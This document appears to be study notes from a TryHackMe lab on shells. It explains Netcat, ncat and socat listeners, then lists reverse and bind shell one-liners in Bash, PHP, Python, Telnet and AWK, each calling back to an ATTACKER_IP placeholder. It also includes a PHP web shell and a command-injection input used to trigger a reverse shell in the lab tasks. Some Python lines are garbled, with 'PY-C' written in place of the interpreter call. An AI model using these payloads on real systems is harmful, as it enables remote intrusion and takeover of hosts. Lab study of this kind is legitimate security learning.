# Reverse Shell

A reverse shell (or "connect back shell") is a common method for cyberattackers to access a system. It establishes a connection from the target system to the attacker's machine, helping to evade detection by firewalls.
How Reverse Shells Work
Setting Up a Netcat Listener

To demonstrate a reverse shell, we use Netcat. The attacker sets up a listener with the command:

nc -lvnp 443

**-l** Listen for connections.
**-v** Verbose mode.
**-n** No DNS resolution.
**-p** Port number (e.g., 443).

Attackers often use common ports (53, 80, 8080, 443, 139, 445) to blend in with legitimate traffic.

Gaining Reverse Shell Access

After setting the listener, the attacker executes a reverse shell payload to exploit vulnerabilities. An example payload is:

rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f

**rm -f /tmp/f** Removes any existing named pipe.
**mkfifo /tmp/f** Creates a named pipe for communication.
**cat /tmp/f** Reads input from the pipe.
**| sh -i 2>&1** Executes commands interactively, redirecting errors.
**| nc ATTACKER_IP ATTACKER_PORT >/tmp/f** Sends output to the attacker's machine.

This payload allows bi-directional communication, exposing the shell to the attacker.

Once the payload runs, the attacker gains a reverse shell, enabling command execution as if logged into the system.

## Blind Shell

A bind shell binds a port on a compromised system to listen for connections, allowing an attacker to execute commands remotely. It's useful when outgoing connections are blocked but is less popular due to detection risks.

To create a bind shell, use the following command on the target machine:

rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f

**rm -f /tmp/f** Removes any existing named pipe.
**mkfifo /tmp/f** Creates a named pipe for communication.
**cat /tmp/f** Reads input from the pipe.
**| bash -i 2>&1** Executes commands interactively, redirecting errors.
**| nc -l 0.0.0.0 8080** Listens on all interfaces at port 8080, exposing the shell.

Using port 8080 avoids the need for elevated privileges.

The attacker connects using:

nc -nv TARGET_IP 8080

**nc** Invokes Netcat to connect.
**-n** Disables DNS resolution.
**-v** Verbose mode for detailed output.
**TARGET_IP** The target machine's IP address.
**8080** The listening port.

After connecting, the attacker gains shell access to execute commands.

## Rlwrap

Rlwrap is a utility that enhances command-line applications with GNU readline features like keyboard editing and command history.

attacker@kali:~$ rlwrap nc -lvnp 443

This command wraps Netcat with rlwrap, enabling arrow key navigation and command history.

## Ncat

Ncat is an enhanced version of Netcat from the NMAP project, offering features like SSL encryption.

### Usage Example (Listening for Reverse Shells)
attacker@kali:~$ ncat -lvnp 4444

### Usage Example (Listening with SSL)
attacker@kali:~$ ncat --ssl -lvnp 4444
The --ssl option enables SSL encryption for secure connections.

## Socat

Socat creates socket connections between two data sources, such as different hosts.

attacker@kali:~$ socat -d -d TCP-LISTEN:443 STDOUT

This command listens on port 443, directing incoming data to the terminal. The -d option enables verbose output.

## Shell Payloads

A shell payload is a command or script that exposes a shell for incoming connections (bind shell) or sends a connection (reverse shell). Here are popular payloads for Linux:
Bash

Normal Bash Reverse Shell
bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
Initiates an interactive bash shell over TCP.

Bash Read Line Reverse Shell
exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; done
Reads and executes commands from a TCP socket.

Bash with File Descriptor 196
0<&196;exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196
Uses file descriptor 196 for TCP connection.

Bash with File Descriptor 5
bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5
Opens an interactive shell using file descriptor 5.

## PHP

PHP Reverse Shell (exec)
php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'
Creates a socket and executes a shell.

PHP Reverse Shell (shell_exec)
php -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh <&3 >&3 2>&3");'
Similar to exec, but uses shell_exec.

PHP Reverse Shell (system)
php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");'
Executes a command and outputs to the browser.

PHP Reverse Shell (passthru)
php -r '$sock=fsockopen("ATTACKER_IP",443);passthru("sh <&3 >&3 2>&3");'
Sends raw output back to the browser.

PHP Reverse Shell (popen)
php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3 2>&3", "r");'
Opens a process file pointer for the shell.

## Python

Python Reverse Shell (Environment Variables)
export RHOST="ATTACKER_IP"; export RPORT=443; PY-C 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
Sets remote host/port, creates a socket, and spawns a shell.

Python Reverse Shell (subprocess)
PY-C 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
Similar to the previous command using subprocess.

Short Python Reverse Shell
PY-C 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
Connects to the attacker and redirects input/output.

## Others

Telnet Reverse Shell
TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP 443 0<$TF | sh 1>$TF
Uses a named pipe and connects via Telnet.

AWK Reverse Shell
awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
Connects using AWK’s TCP capabilities.

## Web Shell

A web shell is a script on a compromised web server that executes commands via the server. It can be hidden in web applications, making it hard to detect and popular among attackers. Web shells can be written in languages like PHP, ASP, JSP, and CGI scripts.
Example PHP Web Shell

<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>

This PHP shell can be saved as shell.php and uploaded to the server through vulnerabilities like Unrestricted File Upload or Command Injection. Accessing it via a URL, e.g., http://victim.com/uploads/shell.php?cmd=whoami, executes the command and displays the result in the browser.
Popular Web Shells

- p0wny-shell: Minimalistic PHP web shell for remote command execution.
- b374k shell: Feature-rich PHP web shell with file management and command execution.
- c99 shell: Well-known PHP web shell with extensive functionality.

## THM Tasks


**rlwrap nc -lvnp 1443** on my machine cmd
**http://MACHINE_IP:8081** in browser to enter site
**hello.txt ; php -r '$sock=fsockopen("ATTACKBOX_IP",1443);exec("sh <&3 >&3 2>&3");'** in site text box
**cat /flag.txt** on cmd, will say connection received since last command

create shell.php in text editor, save to desktop
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
Go to http://MACHINE_IP:8082/
upload shell.php to site
http://MACHINE_IP:8082/uploads/shell.php
Execute cat /flag.txt
